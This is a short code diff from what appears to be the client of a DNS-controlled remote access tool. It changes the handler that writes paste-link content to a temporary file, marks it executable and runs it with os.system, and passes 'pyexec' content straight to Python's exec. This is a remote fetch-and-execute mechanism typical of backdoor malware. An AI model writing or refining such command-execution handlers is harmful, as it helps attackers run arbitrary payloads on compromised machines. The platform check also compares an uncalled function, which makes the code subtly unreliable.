@@ -65,12 +65,26 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
     def on_pastelink_content(self, url, action, content):
         if action.startswith('exec'):
-            with tempfile.NamedTemporaryFile() as tmp:
+            tmp_path = None
+
+            try:
+                fd, tmp_path = tempfile.mkstemp()
+                tmp = os.fdopen(fd, 'wb')
                 tmp.write(content)
-                tmp.flush()
+                tmp.close()
+
                 if not platform.system == 'Windows':
-                    os.chmod(tmp.name, 0700)
-                subprocess.check_output(tmp.name, stderr=subprocess.STDOUT)
+                    os.chmod(tmp_path, 0700)
+
+                os.system(tmp_path)
+
+            except Exception as e:
+                logger.exception(e)
+
+            finally:
+                if tmp_path:
+                    os.unlink(tmp_path)
+
         elif action.startswith('pyexec'):
             try:
                 exec content
